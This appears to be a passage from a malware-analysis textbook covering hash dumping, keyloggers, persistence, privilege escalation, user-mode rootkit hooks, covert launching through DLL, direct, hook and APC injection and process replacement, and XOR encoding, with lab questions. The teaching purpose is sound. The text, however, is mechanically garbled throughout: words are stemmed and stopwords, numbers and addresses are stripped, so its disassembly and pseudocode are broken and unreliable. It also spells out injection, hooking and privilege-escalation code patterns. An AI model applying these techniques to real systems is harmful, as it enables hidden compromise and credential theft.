testdump exampl uniqu api call use whostherealt variant export function testdump push offset libfilenam securdl e call dsloadlibrarya push offset procnam lsaenumeratelogonsess push esi hmodul call dsgetprocaddress call dsgetsystemdirectorya mov edi offset amsvdll msvdll push eax path msvdll call dsgetmodulehandlea sinc dll inject lsassex testdump function perform hash dump export dynam load securdl resolv lsaenumeratelogonsess function obtain list local uniqu identifi known luid list contain usernam domain logon iter dll get access credenti find nonexport function msvdll window dll memori space lsassex use call getmodulehandl shown function nlpgetprimarycredenti use dump nt lm hash note import recogn dump techniqu might critic determin malwar hash store disk post websit use passthehash attack detail could realli import identifi lowlevel hash dump method avoid overal function determin keystrok log keylog classic form credenti steal keylog malwar record keystrok attack observ type data like usernam password window malwar use mani form keylog kernelbas keylogg kernelbas keylogg difficult detect usermod applic frequent part rootkit act keyboard driver capturekeystrok bypass userspac program protect userspac keylogg window userspac keylogg typic use window api usual implement either hook poll hook use window api notifi malwar time key press typic setwindowshookex function poll use window api constantli poll state key typic use getasynckeyst getforegroundwindow function hook keylogg leverag window api function setwindowshookex type keylogg may come packag execut initi hook function may includ dll file handl log map mani process system automat discuss use setwindowshookex chapter well focu poll keylogg use getasynckeyst getforegroundwindow getasynckeyst function identifi whether key press depress whether key press recent call getasynckeyst getforegroundwindow function identifi foreground windowth one focuswhich tell keylogg applic use keyboard entri notepad internet explor exampl figur illustr typic loop structur found poll keylogg program begin call getforegroundwindow log activ window next inner loop iter list key keyboard key call getasynckeyst determin key press program check shift cap lock key determin log keystrok properli inner loop iter entir list key getforegroundwindow function call ensur user still window process repeat quickli enough keep user type keylogg may call sleep function keep program eat system resourcesfigur loop structur getasynckeyst getforegroundwindow keylogg exampl show loop structur figur disassembl exampl disassembl getasynckeyst getforegroundwindow keylogg call dsgetforegroundwindow push h nvirtkey shift call dsgetkeyst mov esi dwordebx push esi vkey movsx edi ax call dsgetasynckeyst test ah h jz short loca f push h nvirtkey cap lock call dsgetkeyst ef add ebx f cmp ebx f jl loc program call getforegroundwindow enter inner loop inner loop start immedi check statu shift key use call getkeyst getkeyst quick way check key statu itdo rememb whether key press sinc last time call getasynckeyst next keylogg index array key keyboard use ebx new key press keystrok log call getkeyst see cap lock activ final ebx increment next key list check key check inner loop termin getforegroundwindow call start inner loop begin identifi keylogg string list recogn keylogg function malwar look import api function examin string list indic particularli use import obfusc malwar use keylog function encount exampl follow list string keylogg describ previou section num lock right left pagedown keylogg want log keystrok must way print key like page must access string work backward crossrefer string way recogn keylog function malwarepersist mechan malwar gain access system often look long time behavior known persist persist mechan uniqu enough even serv great way fingerprint given piec malwar section begin discuss commonli achiev method persist modif system registri next review malwar modifi file persist process known trojan binari final discuss method achiev persist without modifi registri file known dll loadord hijack window registri discuss window registri chapter note common malwar access registri store configur inform gather inform system instal persist seen lab throughout book follow registri key popular place malwar instal hkeylocalmachinesoftwaremicrosoftwindowscurrentversionrun mani persist locat registri wont list memor search entri manual would tediou ineffici tool search persist registri like autorun program sysintern point program automat run system tool like procmon monitor registri modif perform basic dynam analysi although cover registri analysi earlier book coupl popular registri entri worth expand havent discuss yet appinitdl winlogon svchost dll appinitdl malwar author gain persist dll though special registri locat call appinitdl appinitdl load everi process load userdl simpl insert registri make appinitdl persistentth appinitdl valu store follow window registri key hkeylocalmachinesoftwaremicrosoftwindow ntcurrentversionwindow appinitdl valu type regsz consist spacedelimit string dll process load userdl process also load appinitdl malwar author often target individu process appinitdl load mani process therefor malwar author must check see process dll run execut payload check often perform dllmain malici dll winlogon notifi malwar author hook malwar particular winlogon event logon logoff startup shutdown lock screen even allow malwar load safe mode registri entri consist notifi valu follow registri key hkeylocalmachinesoftwaremicrosoftwindow ntcurrentversionwinlogon winlogonex gener event window check notifi registri key dll handl svchost dll discuss chapter servic persist registri theyr remov registri servic wont start malwar often instal window servic typic use execut instal malwar persist svchostex dll make malwar blend process list registri better standard servic svchostex gener host process servic run dll window system often mani instanc svchostex run instanc svchostex contain group servic make develop test servic group manag easier group defin follow registri locat valu repres differ group hkeylocalmachinesoftwaremicrosoftwindow ntcurrentversionsvchost servic defin registri follow locat hkeylocalmachinesystemcurrentcontrolsetservic servicenam window servic contain mani registri valu provid informationabout servic displaynam descript malwar author often set valu help malwar blend netwareman provid access file print resourc netwar network anoth servic registri valu imagepath contain locat servic execut case svchostex dll valu contain systemrootsystemsvchostex k groupnam svchostex dll contain paramet key servicedl valu malwar author set locat malici dll start valu also paramet key determin servic start malwar typic set launch system boot window set number servic group predefin malwar typic creat new group sinc would easi detect instead malwar add preexist group overwrit nonvit serviceoften rare use servic netsvc servic group identifi techniqu monitor window registri use dynam analysi look servic function createservicea disassembl malwar modifi registri key youll know use persist techniqu trojan system binari anoth way malwar gain persist trojan system binari techniqu malwar patch byte system binari forc system execut malwar next time infect binari run load malwar author typic target system binari use frequent normal window oper dll popular target system binari typic modifi patch entri function jump malici code patch overwrit begin function code requir trojan dll oper properli malici code ad empti section binari impact normal oper insert code typic load malwar function matter insert infect dll code load malwar jump back origin dll code everyth still oper prior patch examin one infect system notic system binari rtutilsdlldid expect md hash investig load suspect version rtutilsdl along clean version ida pro comparison dllentrypoint function shown tabl differ obviou trojan version jump anoth locat tabl rtutilsdl dll entri point trojan origin code trojan code dllentrypointhinst hinstdll dword fdwreason lpvoid lpreserv mov edi edi push ebp mov ebp esp push ebx mov ebx ebp push esi mov esi ebpch dllentrypointhinst hinstdll dword fdwreason lpvoid lpreserv jmp dllentrypoint exampl show malici code insert infect rtutilsdl exampl malici patch code insert system dll ea dllentrypoint ea pusha ea call subea ea nop ea subea ea pop ecx ea mov eax ecx eaa add eax h ead push eax eae add ecx ffffeh ea mov eax ecx ea add eax fffdbh eac call eax loadlibrarya eae popa eaf mov edi edi ea push ebp ea mov ebp esp ea jmp locebb eaa amsconfdl db msconfdll see function label dllentrypoint pusha commonli use malici code save initi state regist popa restor malici process complet next codecal subea function execut notic start pop ecx put return address ecx regist sinc pop come immedi call code add x return address xea x xeaa push stack locat xeaa contain string msconfdll seen call loadlibrarya caus patch load msconfdll mean msconfdll run load process load rtutilsdl modul includ svchostex explorerex winlogonex call loadlibrarya patch execut instruct popa thu restor system state save origin pusha instruct popa three instruct start ident first three instruct clean rtutilsdl dllentrypoint shown tabl instruct jmp back origin dllentrypoint method dll loadord hijack dll loadord hijack simpl covert techniqu allow malwar author creat persist malici dll without need registri entri trojan binari techniqu even requir separ malici loader capit way dll load window default search order load dll window xp follow directori applic load current directori system directori getsystemdirectori function use get path windowssystem bit system directori windowssystem window directori getwindowsdirectori function use get path window directori list path environ variabl window xp dll load process skip util knowndll registri key contain list specif dll locat typic locat windowssystem knowndll mechan design toimprov secur malici dll cant place higher load order speed window need conduct default search preced list contain short list import dll dll loadord hijack use binari directori system load dll system protect knowndll exampl explorerex window directori load ntshruidll found system ntshruidll known dll default search follow window directori check system malici dll name ntshruidll place window load place legitim dll malici dll load real dll ensur system continu run properli startup binari found system vulner attack explorerex roughli vulner dll addit known dll fulli protect due recurs import mani dll load dll follow default search orderprivileg escal user run local administr good news malwar author mean user administr access machin give malwar privileg secur commun recommend run local administr accident run malwar wont automat full access system user launch malwar system run administr right malwar usual need perform privileg escal attack gain full access major privilegeescal attack known exploit zeroday attack local os mani found metasploit framework httpwwwmetasploitcom dll loadord hijack even use privileg escal directori malici dll locat writabl user process load dll run higher privileg level malici dll gain escal privileg malwar includ privileg escal rel rare common enough analyst abl recogn sometim even user run local administr malwar requir privileg escal process run window machin run either user system level user gener cant manipul systemlevel process even administr next well discuss common way malwar gain privileg necessari attack systemlevel process window machin use sedebugprivileg process run user dont free access everyth cant instanc call function like terminateprocess createremotethread remot process one way malwar gain access function set access token right enabl sedebugprivileg window system access token object contain secur descriptor process secur descriptor use specifi access right ownerin case process access token adjust call adjusttokenprivileg sedebugprivileg privileg creat tool systemlevel debug malwar author exploit gain full access systemlevel process default sedebugprivileg given local administr account recogn grant sedebugprivileg anyon essenti equival give localsystem account access normal user account give sedebugprivileg request deni exampl show malwar enabl sedebugprivileg exampl set access token sedebugprivileg lea eax espchtokenhandl push eax tokenhandl push tokenadjustprivileg tokenqueri desiredaccess call dsgetcurrentprocess f push eax processhandl call ds openprocesstoken test eax eax jz short loc lea ecx espch luid e push ecx lpluid f push offset name sedebugprivileg push lpsystemnam call ds lookupprivilegevaluea c test eax eax e jnz short loce e mov eax espchluidlowpart mov ecx espchluidhighpart push returnlength push previousst push h bufferlength c lea edx esph newstat push edx newstat mov espchnewstateprivileg luidlowpt eax mov eax espchtokenhandl push disableallprivileg b push eax tokenhandl c mov esphnewstateprivilegecount mov esphnewstateprivileg luidhighpt ecx mov esphnewstateprivilegesattribut seprivilegeen call ds adjusttokenprivileg access token obtain use call openprocesstoken pass process handl obtain call getcurrentprocess desir access case queri adjust privileg pass next malwar call lookupprivilegevaluea retriev local uniqu identifi luid luid structur repres specifi privileg case sedebugprivileg inform obtain openprocesstoken lookupprivilegevaluea use call adjusttokenprivileg key structur ptokenprivileg also pass adjusttokenprivileg label newstat ida pro notic structur set low high bit luid use result lookupprivilegevaluea two step process seen attribut section newstat structur set seprivilegeen order enabl sedebugprivileg combin call often happen system process manipul code see function contain code label move typic necessari analyz intric detail escal method malwar usescov tracksusermod rootkit malwar often goe great length hide run process persist mechan user common tool use hide malici activ refer rootkit rootkit come mani form work modifi intern function os modif caus file process network connect resourc invis program make difficult antiviru product administr secur analyst discov malici activ rootkit modifi userspac applic major modifi kernel sinc protect mechan intrus prevent system instal run kernel level rootkit defens mechan effect run kernel level rather user level kernel level rootkit corrupt system easili user level kernelmod techniqu ssdt hook irp hook discuss chapter well introduc coupl userspac rootkit techniqu give gener understand work recogn field entir book devot rootkit well scratch surfac section good strategi deal rootkit instal hook user level first determin hook place figur hook look iat inlin hook techniqu iat hook iat hook classic userspac rootkit method hide file process network connect local system hook method modifi import address tabl iat export address tabl eat exampl iat hook shown figur legitim program call terminateprocess function seen normal code use iat access target function kerneldl iat hook instal asind malici rootkit code call instead rootkit code return legitim program allow terminateprocess function execut manipul paramet exampl iat hook prevent legitim program termin process figur iat hook terminateprocess top path normal flow bottom path flow rootkit iat techniqu old easili detect form hook mani modern rootkit use advanc inlin hook method instead inlin hook inlin hook overwrit api function code contain import dll must wait dll load begin execut iat hook simpli modifi pointer inlin hook chang actual function code malici rootkit perform inlin hook often replac start code jump take execut malici code insert rootkit altern rootkit alter code function damag chang rather jump malici code exampl inlin hook zwdeviceiocontrolfil function shown exampl function use program like netstat retriev network inform system exampl inlin hook exampl b mov edi offset procnam zwdeviceiocontrolfil b mov esi offset ntdll ntdlldll push edi lpprocnam bf push esi lplibfilenam c call dsloadlibrarya c push eax hmodul c call dsgetprocaddress cd test eax eax cf mov ptrzwdeviceiocontrolfil eax locat function hook acquir rootkit goal instal byte inlin hook start zwdeviceiocontrolfil function memori tabl show hook initi raw byte shown left assembl shown right tabl byte inlin hook raw byte disassembl byte db bh db db db db db ffh db eh mov eax jmp eax assembl start opcod xb mov immr follow four zero byte opcod xff xe jmp eax rootkit fill zero byte address instal hook jmp instruct valid activ view press c key keyboard ida pro rootkit use simpl memcpi patch zero byte includ address hook function hide traffic destin port notic address given match address zero byte previou exampl push db push eax dc push offset unk e mov eax offset hookingfunctionhideport e call memcpi patch byte hook locat sent function instal inlin hook shown exampl exampl instal inlin hook ed push ef push offset ptrzwdeviceiocontrolfil f push offset patchbyt f push edi fa push esifb call installinlinehook zwdeviceiocontrolfil call rootkit function first rootkit hook function remov traffic destin port call real zwdeviceiocontrolfil everyth continu oper hook instal sinc mani defens program expect inlin hook instal begin function malwar author attempt insert jmp code modif api code make harder findconclus chapter given quick tour common capabl malwar start differ type backdoor explor malwar steal credenti victim next look differ way malwar achiev persist system final show malwar cover track easili found introduc common malwar behavior next sever chapter deepen discuss malwar behavior next chapter talk malwar covertli launch later chapter well look malwar encod data commun networkslab lab analyz malwar found labex question q malwar drop disk q malwar achiev persist q malwar steal user credenti q malwar stolen credenti q use malwar get user credenti test environ lab analyz malwar found labdll assum suspici file name labini also found malwar question q export dll malwar q happen attempt instal malwar use rundllex q must labini resid order malwar instal properli q malwar instal persist q userspac rootkit techniqu malwar employ q hook code q process malwar attack q signific ini file q dynam captur malwar activ wireshark lab analyz malwar found labex labdll make sure file directori analysi question q interest analysi lead discov use basic static analysi q happen run malwar q labex persist instal labdll q window system file malwar infect q labdll q malwar store data collectschapt covert malwar launch comput system user becom sophist malwar evolv exampl mani user know list process window task manag malici softwar use appear malwar author develop mani techniqu blend malwar normal window landscap effort conceal chapter focus method malwar author use avoid detect call covert launch techniqu youll learn recogn code construct code pattern help identifi common way malwar covertli launch launcher discuss previou chapter launcher also known loader type malwar set anoth piec malwar immedi futur covert execut goal launcher set thing malici behavior conceal user launcher often contain malwar theyr design load common exampl execut dll resourc section resourc section window pe file format use execut consid part execut exampl normal content resourc section includ icon imag menu string launcher often store malwar within resourc section launcher run extract embed execut dll resourc section launch seen previou exampl resourc section compress encrypt malwar must perform resourc section extract load often mean see launcher use resourcemanipul api function findresourc loadresourc sizeofresourc malwar launcher often must run administr privileg escal privileg averag user process cant perform thetechniqu discuss chapter discuss privileg escal previou chapter fact launcher may contain privilegeescal code provid anoth way identifi themprocess inject popular covert launch techniqu process inject name impli techniqu inject code anoth run process process unwittingli execut malici code malwar author use process inject attempt conceal malici behavior code sometim use tri bypass hostbas firewal processspecif secur mechan certain window api call commonli use process inject exampl virtualallocex function use alloc space extern processs memori writeprocessmemori use write data alloc space pair function essenti first three load techniqu well discuss chapter dll inject dll inject form process inject remot process forc load malici dlli commonli use covert load techniqu dll inject work inject code remot process call loadlibrari therebi forc dll load context process compromis process load malici dll os automat call dll dllmain function defin author dll function contain malici code much access system process run malici dll often littl content dllmain function everyth appear origin compromis process figur show exampl dll inject exampl launcher malwar inject dll internet explor memori therebi give inject dll access internet internet explor loader malwar unabl access internet prior inject processspecif firewal detect block itfigur dll injectionth launcher malwar access internet inject iexploreex order inject malici dll host program launcher malwar must first obtain handl victim process common way use window api call createtoolhelpsnapshot processfirst processnext search process list inject target target found launcher retriev process identifi pid target process use obtain handl via call openprocess function createremotethread commonli use dll inject allow launcher malwar creat execut new thread remot process createremotethread use pass three import paramet process handl hprocess obtain openprocess along start point inject thread lpstartaddress argument thread lpparamet exampl start point might set loadlibrari malici dll name pass argument trigger loadlibrari run victim process paramet malici dll therebi caus dll load victim process assum loadlibrari avail victim processs memori space malici librari name string exist within space malwar author gener use virtualallocex creat space malici librari name string virtualallocex function alloc space remot process handl process provid last setup function requir createremotethread call iswriteprocessmemori function write malici librari name string memori space alloc virtualallocex exampl contain c pseudocod perform dll inject exampl c pseudocod dll inject hvictimprocess openprocessprocessallaccess victimprocessid pnameinvictimprocess virtualallocex hvictimprocess sizeofmaliciouslibrarynam writeprocessmemori hvictimprocess maliciouslibrarynam sizeofmaliciouslibrarynam getmodulehandlekerneldl getprocaddressloadlibrarya createremotethread hvictimprocess loadlibraryaddresspnameinvictimprocess list assum obtain victim pid victimprocessid pass openprocess order get handl victim process use handl virtualallocex writeprocessmemori alloc space write name malici dll victim process next getprocaddress use get address loadlibrari final createremotethread pass three import paramet discuss earlier handl victim process address loadlibrari pointer malici dll name victim process easiest way identifi dll inject identifi trademark pattern window api call look launcher malwar disassembl dll inject malwar launcher never call malici function state earlier malici code locat dllmain automat call os dll load memori dll inject launcher goal call createremotethread order creat remot thread loadlibrari paramet malici dll inject figur show dll inject code seen debugg six function call pseudocod exampl seen disassembl label figur dll inject debugg view find dll inject activ disassembl start look string contain name malici dll victim process case figur dont see string must access code execut victim process name often found strncmp function equival launcher determin victim processs pid find malici dll name could set breakpoint x dump content stack reveal valu buffer pass writeprocessmemori your abl recogn dll inject code pattern identifi import string abl quickli analyz entir group malwar launcher direct inject like dll inject direct inject involv alloc insert code memori space remot process direct inject use mani samewindow api call dll inject differ instead write separ dll forc remot process load directinject malwar inject malici code directli remot process direct inject flexibl dll inject requir lot custom code order run success without neg impact host process techniqu use inject compil code often use inject shellcod three function commonli found case direct inject virtualallocex writeprocessmemori createremotethread typic two call virtualallocex writeprocessmemori first alloc write data use remot thread second alloc write remot thread code call createremotethread contain locat remot thread code lpstartaddress data lpparamet sinc data function use remot thread must exist victim process normal compil procedur work exampl string normal data section loadlibrari getprocaddress need call access function alreadi load restrict wont go basic direct inject requir author either skill assembl languag coder inject rel simpl shellcod order analyz remot thread code may need debug malwar dump memori buffer occur call writeprocessmemori analyz disassembl sinc buffer often contain shellcod need shellcod analysi skill discuss extens chapter process replac rather inject code host program malwar use method known process replac overwrit memori space run process malici execut process replac use malwar author want disguis malwar legitim process without risk crash process use process inject techniqu provid malwar privileg process replac exampl piec malwar perform process replac attack svchostex user would see process name svchostex run cwindowssystem probabl think noth common malwar attack way key process replac creat process suspend state mean process load memori primari thread process suspend program anyth extern program resum primari thread caus program start run exampl show malwar author achiev suspend state pass createsuspend x dwcreationflag paramet perform call createprocess exampl assembl code show process replac push edi lpprocessinform push ecx lpstartupinfo push ebx lpcurrentdirectori push ebx lpenviron push createsuspend dwcreationflag b push ebx binherithandl c push ebx lpthreadattribut lea edx esphcommandlin push ebx lpprocessattribut push edx lpcommandlin push ebx lpapplicationnam mov espahstartupinfodwflag h f mov espahstartupinfowshowwindow bx call ds createprocessa although poorli document microsoft method process creation use load process memori suspend entri point exampl show c pseudocod perform process replacementexampl c pseudocod process replac createprocesssvchostexecreatesuspend zwunmapviewofsect virtualallocex imagebasesizeofimag writeprocessmemori header numberofsect writeprocessmemori section setthreadcontext resumethread process creat next step replac victim processs memori malici execut typic use zwunmapviewofsect releas memori point section pass paramet memori unmap loader perform virtualallocex alloc new memori malwar use writeprocessmemori write malwar section victim process space typic loop shown final step malwar restor victim process environ malici code run call setthreadcontext set entri point point malici code final resumethread call initi malwar replac victim process process replac effect way malwar appear nonmalici masquerad victim process malwar abl bypass firewal intrus prevent system ipss avoid detect appear normal window process also use origin binari path malwar deceiv savvi user view process list see known valid binari execut idea unmappedhook inject hook inject describ way load malwar take advantag window hook use intercept messag destin applic malwar author use hook inject accomplish two thing sure malici code run whenev particular messag intercept sure particular dll load victim processs memori space shown figur user gener event sent os send messag creat event thread regist receiv right side figur show one way attack insert malici dll intercept messag figur event messag flow window without hook inject local remot hook two type window hooksloc hook use observ manipul messag destin intern process remot hook use observ manipul messag destin remot process anoth process system remot hook avail two form high low level highlevel remot hook requir hook procedur export function contain dll map os process space hook thread thread lowlevel remot hook requir hook procedur contain process instal hook procedur notifi os get chanc process event keylogg use hook hook inject frequent use malici applic known keylogg record keystrok keystrok captur regist highor low level hook use whkeyboard whkeyboardl hook procedur type respect whkeyboard procedur hook often run context remot process also run process instal hook whkeyboardl procedur event sent directli process instal hook hook run context process creat use either hook type keylogg intercept keystrok log file alter pass along process system use setwindowshookex princip function call use perform remot window hook setwindowshookex follow paramet idhook specifi type hook procedur instal lpfn point hook procedur hmod highlevel hook identifi handl dll contain hook procedur defin lpfn lowlevel hook identifi local modul lpfn procedur defin dwthreadid specifi identifi thread hookprocedur associ paramet zero hook procedur associ exist thread run desktop call thread must set zero lowlevel hook hook procedur contain code process messag come system noth either way hook procedur must call callnexthookex ensur next hook procedur call chain get messag system continu run properli thread target target specif dwthreadid malwar gener includ instruct determin system thread identifi use design load thread said malwar load thread keylogg equival goal messag intercept howev load thread degrad run system may trigger ip therefor goal simpli load dll remot process singl thread inject order remain stealthi target singl thread requir search process list target process requir malwar run program target process alreadi run malici applic hook window messag use frequent like trigger ip malwar often set hook messag often use whcbt computerbas train messag exampl show assembl code perform hook inject order load dll differ processs memori space exampl hook inject assembl code push esi push edi push offset libfilenam hookdll call loadlibrarya mov esi eax f push offset procnam malwareproc push esi hmodul call getprocaddress b mov edi eax call getnotepadthreadid push eax dwthreadid push esi hmod push edi lpfn push whcbt idhook call setwindowshookexa exampl malici dll hookdll load malwar malici hook procedur address obtain hook procedur malwareproc call callnexthookex setwindowshookex call thread notepadex assum notepadex run getnotepadthreadid local defin function obtain dwthreadid notepadex final whcbt messag sent inject notepadex order forc hookdll load notepadex allow hookdll run notepadex process space hookdll inject execut full malici code store dllmain disguis notepadex process sinc malwareproc call callnexthookex interfer incom messag malwar often immedi call loadlibrari unhookwindowshookex dllmain ensur incom messag impacteddetour detour librari develop microsoft research origin intend way easili instrument extend exist os applic function detour librari make possibl develop make applic modif simpli malwar author like detour use detour librari perform import tabl modif attach dll exist program file add function hook run process malwar author commonli use detour add new dll exist binari disk malwar modifi pe structur creat section name detour typic place export tabl debug symbol detour section contain origin pe header new import address tabl malwar author use detour modifi pe header point new import tabl use setdll tool provid detour librari figur show peview detour use trojan notepadex notic detour section new import tabl contain evildl seen evildl load whenev notepad launch notepad continu oper usual user would idea malici dll execut figur peview detour evildllinstead use offici microsoft detour librari malwar author known use altern custom method add detour section use method detour addit impact abil analyz malwareapc inject earlier chapter saw creat thread use createremotethread invok function remot process howev thread creation requir overhead would effici invok function exist thread capabl exist window asynchron procedur call apc apc direct thread execut code prior execut regular execut path everi thread queue apc attach process thread alert state call function like waitforsingleobjectex waitformultipleobjectsex sleep function essenti give thread chanc process wait apc applic queue apc thread alert thread begin run thread begin call apc function thread call apc function one one apc apc queue apc queue complet thread continu run along regular execut path malwar author use apc preempt thread alert state order get immedi execut code apc come two form apc gener system driver call kernelmod apc apc gener applic call usermod apc malwar gener usermod apc kernel user space use apc inject let take closer look method apc inject user space user space anoth thread queue function invok remot thread use api function queueuserapc thread must alert state order run usermod apc malwar look target thread process like go state luckili malwar analyst waitforsingleobjectex common call window api usual mani thread alert statelet examin queueuserapc paramet pfnapc hthread dwdata call queueuserapc request thread whose handl hthread run function defin pfnapc paramet dwdata exampl show malwar use queueuserapc forc dll load context anoth process although arriv code malwar alreadi pick target thread note analysi find threadtarget code look api call createtoolhelpsnapshot processfirst processnext malwar find target process api call often follow call threadfirst threadnext loop look target thread contain target process altern malwar also use ntzwquerysysteminform systemprocessinform inform class find target process exampl apc inject usermod applic da push espdwthreadid dwthreadid dad push binherithandl daf push h dwdesiredaccess db call dsopenthread db mov esi eax db test esi esi dbb jz short locdc dbd push espdwdata dwdata dbnetdll dc push esi hthread dc push dsloadlibrarya pfnapc dc call ds queueuserapc targetthread identifi obtain malwar use open handl thread seen exampl malwar look forc thread load dll remot process see call queueuserapc pfnapc set loadlibrarya paramet sent loadlibrarya contain dwdata exampl set dll dbnetdll earlier code apc queu thread goe alert state loadlibrarya call remot thread caus target process load dbnetdll exampl malwar target svchostex popular target apc inject thread often alert state malwar may apcinject everi thread svchostex ensur execut occur quicklyapc inject kernel space malwar driver rootkit often wish execut code user space easi way one method use perform apc inject kernel space get code execut user space malici driver build apc dispatch thread execut usermod process often svchostex apc type often consist shellcod devic driver leverag two major function order util apc keinitializeapc keinsertqueueapc exampl show exampl function use rootkit exampl usermod apc inject kernel space bd push ebx push c push ebparg c push ebx c push offset sub c push cb push ebparg ce push esi cf call ds keinitializeapc cmp edi ebx jz short locea push ebx da push ebpargc dd push ebparg e push esi e call edi keinsertqueueapc apc first must initi call keinitializeapc sixth paramet normalroutin nonzero combin seventh paramet apcmod set look usermod type therefor focus two paramet tell rootkit use apc inject run code user space keinitializeapc initi kapc structur must pass keinsertqueueapc place apc object target thread correspond apc queue exampl esi contain kapc structur keinsertqueueapc success apc queu run exampl malwar target svchostex make determin would need trace back secondtolast paramet push stack keinitializeapc paramet contain thread inject thiscas contain arg seen therefor would need look back code check arg set order see svchostex thread targetedconclus chapter weve explor common covert method malwar launch rang simpl advanc mani techniqu involv manipul live memori system dll inject process replac hook inject techniqu involv modifi binari disk case ad detour section pe file although techniqu differ achiev goal malwar analyst must abl recogn launch techniqu order know find malwar live system recogn analyz launch techniqu realli part full analysi sinc launcher one thing get malwar run next two chapter learn malwar encod data commun networklab lab analyz malwar found file labex labdll make sure file directori perform analysi question q happen run malwar execut q process inject q make malwar stop popup q malwar oper lab analyz malwar found file labex question q purpos program q launcher program hide execut q malici payload store q malici payload protect q string protect lab analyz malwar extract analysi lab solut use file labex question q purpos malici payload q malici payload inject itselfq filesystem residu program creat lab analyz malwar found file labex question q code x accomplish q process code inject q dll load use loadlibrarya q fourth argument pass createremotethread call q malwar drop main execut q purpos drop malwarechapt data encod context malwar analysi term data encod refer form content modif purpos hide intent malwar use encod techniqu mask malici activ malwar analyst youll need understand techniqu order fulli understand malwar use data encod attack choos method best meet goal sometim choos simpl cipher basic encod function easi code provid enough protect time use sophist cryptograph cipher custom encrypt make identif reverseengin difficult begin chapter focus find identifi encod function cover strategi decod goal analyz encod algorithm malwar use encod varieti purpos common use encrypt networkbas commun malwar also use encod disguis intern work exampl malwar author might use layer encod purpos hide configur inform commandandcontrol domain save inform stage file steal store string use malwar decod need disguis malwar legitim tool hide string use malici activ goal analyz encod algorithm alway consist two part identifi encod function use knowledg decod attack secretssimpl cipher simpl encod techniqu exist thousand year might assum massiv comput capac modern comput made simpl cipher extinct case simpl encod techniqu often use disguis content appar humanread transform data differ charact set simpl cipher often disparag unsophist offer mani advantag malwar includ follow small enough use spaceconstrain environ exploit shellcod less obviou complex cipher low overhead thu littl impact perform malwar author use simpl cipher dont expect immun detect theyr simpli look easi way prevent basic analysi identifi activ caesar cipher one first cipher ever use caesar cipher caesar cipher use roman empir hide messag transport battlefield courier simpl cipher form shift letter alphabet three charact right exampl follow text show secret wartim messag encrypt caesar cipher attack noon dwwdfn dw qrrq xor xor cipher simpl cipher similar caesar cipher xor mean exclus logic oper use modifi bit xor cipher use static byte valu modifi byte plaintext perform logic xor oper valu exampl figur show messag attack noon would encod use xor withth byte xc charact repres cell ascii charact control code top hex valu charact bottom figur string attack noon encod xor xc origin string top encod string bottom see exampl xor cipher often result byte limit printabl charact indic use shade cell c attack translat hex xf typic use indic delet charact vein space charact translat hex xc typic use file separ xor cipher conveni use simplerequir singl machinecod instructionand revers revers cipher use function encod decod order decod someth encod xor cipher simpli repeat xor function key use encod implement xor encod discussingwher key everi encod bytei known singlebyt xor encod bruteforc xor encod imagin investig malwar incid learn second malwar start two file creat browser cach directori one file swf file assum use exploit browser flash plug file name agif doesnt appear gif header would start charact gifa gifa instead agif file begin byte shown exampl exampl first byte xorencod file agif f ed ed hb aa r c b df aa e df b f f fzabusga suspect file may xorencod execut find one strategi work singlebyt encod brute forc sinc possibl valu charact file easi quick enough comput tri possibl singlebyt key xore file header compar output header would expect execut file xor encod use key could perform script tabl show output script might reveal tabl show first byte agif file encod differ xor key goal bruteforc tri sever differ valu xor key see output recognizein case mz header first column list valu use xor key second column show initi byte content transform last column show whether suspect content found tabl bruteforc xorencod execut xor key valu initi byte file mz header found origin f ed ed xor x e c ec ec xor x f ef ef xor x c b e ee ee xor x b c e e xor x e e xor x f ff ff yesnotic last row tabl use xor x find mz header pe file begin letter mz hex charact z respect first two hex charact particular string next examin larger portion header see part file shown exampl exampl first byte decrypt pe file f ff ff mzp b ba e f b cd b c cd l f program mu see word program mu start do stub common element within execut file provid addit evid inde pe file bruteforc mani file bruteforc also use proactiv exampl want search mani file check xorencod pe file could creat signatur xor combin focus element file think might present exampl say want search singlebyt xor encod string program common pe file header contain string program must run win program run do gener possibl permut origin string possibl xor valu come set signatur search shown tabl tabl creat xor bruteforc signatur xor key valu program origin f xor x e c xor x b f xor x b c e xor x c b xor x c xor xff ab c df f e df nullpreserv singlebyt xor encod look encod file shown exampl notic blatant xor key x even glanc byte initi part header x demonstr particular weak singlebyt encod lack abil effect hide user manual scan encod content hex editor encod content larg number null byte singlebyt key becom obviou malwar author actual develop clever way mitig issu use nullpreserv singlebyt xor encod scheme unlik regular xor encod scheme nullpreserv singlebyt xor scheme two except plaintext charact null key byte skip plaintext charact neither null key encod via xor key shown tabl code modifi xor much complic origin tabl origin vs nullpreserv xor encod code origin xor nullpreserv xor bufi key bufi bufi key bufi key tabl c code origin xor function shown left nullpreserv xor function right key x x x transform byte transform viaan xor x pe file encod fashion key encod much less visual appar compar exampl obviou x key exampl exampl repres encod pe file encod x time use nullpreserv singlebyt xor encod see nullpreserv encod difficult identifi xor encod evid key exampl first byte file nullpreserv xor encod f ed ed hb aa r c b df aa e df b f f fzabusga nullpreserv xor techniqu especi popular shellcod import abl perform encod small amount code identifi xor loop ida pro imagin find shellcod within swf file disassembl shellcod ida pro want find xor loop suspect exist decod associ agif file disassembl xor loop identifi small loop xor instruct middl loop easiest way find xor loop ida pro search instanc xor instruct follow make sure view code window titl contain ida view select search text text search dialog enter xor select find occurr checkbox click ok see window like one shown figur figur search xor ida pro search found xor instruct mean xor instruct use encod xor instruct use differ purpos one use xor clear content regist xor instruct found three form xor regist xor regist memori refer constant xor one regist memori refer differ regist memori refer preval form first sinc xor regist effici way zero regist fortun clear regist relat data encod ignor see figur list instruct xor regist xor edxedx xor encod loop may use either two form xor regist constant xor regist differ regist lucki xor regist constant confirm probabl see encod know key instruct xor edx h figur exampl second form xor one sign encod small loop contain xor function let look instruct identifi figur ida pro flowchart figur show xor x instruct appear part small loop also see block locf increment counter block loc check see whether counter exceed acertain length figur graphic view singlebyt xor loop simpl encod scheme given weak singlebyt encod mani malwar author implement slightli involv unexpect encod scheme less suscept bruteforc detect still simpl implement tabl briefli describ encod scheme wont delv specif techniqu awar recogn see tabl addit simpl encod algorithm encod scheme descriptionadd sub encod algorithm use add sub individu byte manner similar xor add sub revers need use tandem one encod decod rol ror instruct rotat bit within byte right left like add sub need use togeth sinc revers rot origin caesar cipher commonli use either alphabet charact z z printabl charact standard ascii multibyt instead singl byte algorithm might use longer key often byte length typic use xor block conveni chain loopback algorithm use content part key variou implement commonli origin key appli one side plaintext start end encod output charact use key next charact base base encod use repres binari data ascii string format base encod commonli found malwar youll need know recogn term base taken multipurpos internet mail extens mime standard origin develop encod 